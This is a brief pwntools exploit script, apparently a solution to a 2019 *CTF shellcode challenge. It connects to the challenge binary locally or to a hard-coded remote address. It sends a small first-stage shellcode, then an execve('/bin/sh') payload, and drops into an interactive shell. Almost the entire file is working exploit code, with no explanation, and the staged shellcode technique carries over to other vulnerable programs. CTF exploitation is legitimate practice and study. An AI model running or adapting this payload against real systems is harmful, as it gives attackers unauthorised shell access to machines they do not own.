#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./star_ctf_shellcode"
elf=ELF(pwn_file)
context.arch = elf.arch
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("34.92.37.22",10002)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

shellcode1 = """
  pop rdx
  pop rdx
  pop rdx
  pop rdx
  pop rdi
  pop rdi
  syscall
"""

real_shellcode = """
  call here
  .ascii "/bin/sh"
  .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx,rdx
   mov rax,0x3b
   syscall
"""
payload = asm(shellcode1)

r.sendlineafter("plz:\n",payload)

r.sendline(len(payload)*'a'+asm(real_shellcode))

r.interactive()
